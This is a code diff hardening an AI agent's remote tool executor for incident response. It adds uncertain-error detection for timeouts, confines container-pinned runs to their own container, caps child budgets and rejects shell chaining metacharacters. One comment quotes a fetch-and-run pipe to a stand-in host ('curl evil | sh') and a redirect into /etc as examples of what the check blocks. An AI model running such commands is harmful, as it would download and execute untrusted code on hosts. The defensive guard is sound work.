@@ -18,6 +18,7 @@ evidence) and is never auto-retried.
 from __future__ import annotations
 
 import asyncio
+import re
 from dataclasses import dataclass
 from datetime import UTC, datetime
 from pathlib import PurePosixPath
@@ -97,7 +98,10 @@ from incidentlens_control_plane.remote_ops.gateway import (
     Gateway,
     RemoteToolGateway,
 )
-from incidentlens_control_plane.remote_ops.policy import CommandPolicy
+from incidentlens_control_plane.remote_ops.policy import (
+    CommandPolicy,
+    has_shell_control_metacharacters,
+)
 from incidentlens_control_plane.remote_ops.sessions import SessionManager
 from incidentlens_control_plane.remote_ops.shell import PersistentShell
 from incidentlens_control_plane.remote_ops.transport import (
@@ -123,6 +127,44 @@ from incidentlens_control_plane.remote_ops.types import (
 _HOST_EVIDENCE_SERVICE = "host"
 
 _MAX_FILE_READ_BYTES = 1_048_576
+
+# Message markers that reliably indicate a remote timeout/connection failure
+# even after a gateway or change manager has wrapped the original exception.
+_UNCERTAIN_MESSAGE_RE = re.compile(
+    r"(timed out|timeout|connection (?:refused|reset|closed|unreachable)|"
+    r"broken pipe|remote closed)",
+    re.IGNORECASE,
+)
+
+
+def _is_uncertain_error(exc: BaseException) -> bool:
+    """Return True when *exc* or its cause chain is a timeout/connection loss.
+
+    ``RemoteToolGateway.docker_action`` wraps transport failures in
+    ``DockerActionError`` and ``ChangeManager`` folds them into a FAILED
+    ``ChangeResult``, so a bare ``RemoteTimeoutError`` never reaches the
+    executor.  Walking ``__cause__``/``__context__`` recovers the recognisable
+    signal so the run is paused UNCERTAIN with UNCERTAIN_STATE evidence instead
+    of a deterministic FAILED.
+    """
+    seen: set[int] = set()
+    current: BaseException | None = exc
+    while current is not None and id(current) not in seen:
+        seen.add(id(current))
+        if isinstance(
+            current,
+            (RemoteTimeoutError, RemoteConnectionError, asyncio.TimeoutError),
+        ):
+            return True
+        if _UNCERTAIN_MESSAGE_RE.search(str(current)):
+            return True
+        current = current.__cause__ or current.__context__
+    return False
+
+
+def _message_indicates_uncertain(message: str | None) -> bool:
+    """Return True when a wrapped error string mentions a timeout/connection loss."""
+    return message is not None and _UNCERTAIN_MESSAGE_RE.search(message) is not None
 
 
 class ToolExecutionError(Exception):
@@ -431,6 +473,8 @@ class ToolExecutor:
         joined = "; ".join(entries[:10])
         if len(entries) > 10:
             joined += f"; ... ({len(entries)} total)"
+        if not joined:
+            joined = "none"
         summary = f"{len(refs)} evidence refs for run {ctx.run.agent_run_id}: {joined}"
         evidence = tuple(
             EvidenceReference(
@@ -535,6 +579,7 @@ class ToolExecutor:
         args = ctx.arguments
         service_name = args["service_name"]
         path = self._parse_path(args["path"])
+        self._assert_run_scope(ctx, scope)
         svc = self._resolve_service(ctx, service_name)
         self._validate_path_in_scope(ctx, path, scope=scope)
         result = await self._gateway.read(
@@ -557,7 +602,7 @@ class ToolExecutor:
             content=text,
             size_bytes=result.metadata.size,
         )
-        preview = ref.content_redacted[:300]
+        preview = ref.content_redacted[:300] or "(empty content)"
         summary = (
             f"read {result.path} ({result.metadata.size} bytes, "
             f"truncated={result.truncated}); sha256={result.sha256[:16]}; {preview}"
@@ -572,6 +617,7 @@ class ToolExecutor:
         args = ctx.arguments
         service_name = args["service_name"]
         path = self._parse_path(args["path"])
+        self._assert_run_scope(ctx, scope)
         svc = self._resolve_service(ctx, service_name)
         self._validate_path_in_scope(ctx, path, scope=scope)
         entries = await self._gateway.list_dir(
@@ -599,6 +645,7 @@ class ToolExecutor:
         service_name = args["service_name"]
         path = self._parse_path(args["path"])
         query = args["query"]
+        self._assert_run_scope(ctx, scope)
         svc = self._resolve_service(ctx, service_name)
         self._validate_path_in_scope(ctx, path, scope=scope)
         matches = await self._gateway.search(
@@ -634,6 +681,7 @@ class ToolExecutor:
         args = ctx.arguments
         service_name = args["service_name"]
         path = self._parse_path(args["path"])
+        self._assert_run_scope(ctx, scope)
         svc = self._resolve_service(ctx, service_name)
         self._validate_path_in_scope(ctx, path, scope=scope)
         meta = await self._gateway.stat(
@@ -764,6 +812,14 @@ class ToolExecutor:
         command = args["command"]
         timeout = float(args.get("timeout_seconds", 30))
         svc = self._resolve_service(ctx, service_name)
+        # Second layer of the shell gate: reject command chaining/redirection
+        # outright, independent of CommandPolicy, so a single auto-read
+        # executable can never smuggle ``&& curl evil | sh`` or ``> /etc/evil``.
+        if has_shell_control_metacharacters(command):
+            raise ToolExecutionError(
+                "command contains shell chaining/redirection metacharacters "
+                "(& | ; < >) and is not allowed"
+            )
         cwd_path = None
         if args.get("cwd") is not None:
             cwd_path = self._parse_path(args["cwd"])
@@ -812,7 +868,7 @@ class ToolExecutor:
             output=bound,
             exit_code=shell_result.exit_status,
         )
-        preview = ref.content_redacted[:300]
+        preview = ref.content_redacted[:300] or "(no output)"
         summary = f"command exited {shell_result.exit_status}: {preview}"
         return ToolResult(
             evidence=(self._evidence_ref(ctx, ref, summary),),
@@ -830,10 +886,24 @@ class ToolExecutor:
         args = ctx.arguments
         service_name = args["service_name"]
         path = self._parse_path(args["path"])
-        scope = LogScope(args.get("scope", "host"))
         svc = self._resolve_service(ctx, service_name)
+        scope_arg = args.get("scope", "host")
+        container_arg = args.get("container")
+        if ctx.run.scope.scope is LogScope.CONTAINER:
+            # A container-scoped run is pinned to its own container: a mutation
+            # must name its own container scope and the default host scope is
+            # rejected outright so the pin can never be silently dropped.
+            if scope_arg != "container":
+                raise ToolExecutionError(
+                    "container-scope run may only modify files inside its own "
+                    "container (scope must be 'container')"
+                )
+            scope = LogScope.CONTAINER
+            container_arg = args.get("container", ctx.run.scope.container_name)
+        else:
+            scope = LogScope(scope_arg)
         self._validate_path_in_scope(ctx, path, scope=scope)
-        remote_scope, container = self._scope_arg(ctx, svc, scope, args.get("container"))
+        remote_scope, container = self._scope_arg(ctx, svc, scope, container_arg)
         # The changeset id is derived from the tool-call id so the approval
         # intent requested up front names the same changeset that ``apply``
         # later consumes on an approved re-execution.
@@ -890,6 +960,13 @@ class ToolExecutor:
             f"changeset {result.changeset_id} status={result.status.value} "
             f"applied={result.applied_files} error={result.error or ''}"
         )
+        if not passed and (
+            result.uncertain or _message_indicates_uncertain(result.error)
+        ):
+            # ChangeManager folds transport timeouts/connection loss into a
+            # FAILED ChangeResult; surface them as UNCERTAIN so the run pauses
+            # with UNCERTAIN_STATE evidence instead of a deterministic FAILED.
+            raise ToolUncertain(result.error or "remote operation failed")
         if passed:
             ref = self._evidence.record_validation_result(
                 **self._evidence_kwargs(ctx, service_name, str(path)),
@@ -947,7 +1024,15 @@ class ToolExecutor:
             container=container,
             reason=reason,
         )
-        result = await self._gateway.docker_action(request, approval_id=ctx.approval_id)
+        try:
+            result = await self._gateway.docker_action(request, approval_id=ctx.approval_id)
+        except Exception as exc:
+            # The gateway wraps transport failures in ``DockerActionError``;
+            # recover the original timeout/connection signal so the run pauses
+            # UNCERTAIN instead of reporting a deterministic FAILED.
+            if _is_uncertain_error(exc):
+                raise ToolUncertain(str(exc))
+            raise
         if not result.approved:
             return ToolResult(
                 status=ToolCallStatus.WAITING_APPROVAL,
@@ -1011,6 +1096,13 @@ class ToolExecutor:
             )
         return container
 
+    def _assert_run_scope(self, ctx: ToolContext, scope: LogScope) -> None:
+        """Reject host-scope file ops from a container-pinned run."""
+        if ctx.run.scope.scope is LogScope.CONTAINER and scope is LogScope.HOST:
+            raise ToolExecutionError(
+                "container-scope run may only operate inside its own container"
+            )
+
     def _validate_path_in_scope(
         self, ctx: ToolContext, path: PurePosixPath, *, scope: LogScope
     ) -> PurePosixPath:
@@ -1053,17 +1145,14 @@ class ToolExecutor:
             for name in AgentBudget.model_fields
         }
         budget = AgentBudget(**kwargs)
+        # The child budget must never exceed the parent run's on ANY axis, so a
+        # child cannot widen its own evidence/output/wall-clock envelope.
         base = ctx.run.budget
-        for field_name, limit_name in (
-            ("max_rounds", "max_rounds"),
-            ("max_tool_calls", "max_tool_calls"),
-            ("max_output_bytes_per_tool", "max_output_bytes_per_tool"),
-            ("max_total_output_bytes", "max_total_output_bytes"),
-        ):
-            if getattr(budget, field_name) > getattr(base, limit_name):
+        for field_name in AgentBudget.model_fields:
+            if getattr(budget, field_name) > getattr(base, field_name):
                 raise ToolExecutionError(
                     f"child {field_name} must not exceed the run budget "
-                    f"({getattr(base, limit_name)})"
+                    f"({getattr(base, field_name)})"
                 )
         return budget
 
@@ -1177,6 +1266,8 @@ class ToolExecutor:
     def _log_records_summary(
         self, selected: tuple[LogRecord, ...], total: int
     ) -> str:
+        if not selected:
+            return "no log records matched"
         previews = [self._log_record_preview(record) for record in selected[:5]]
         joined = "; ".join(previews)
         if len(selected) < total:
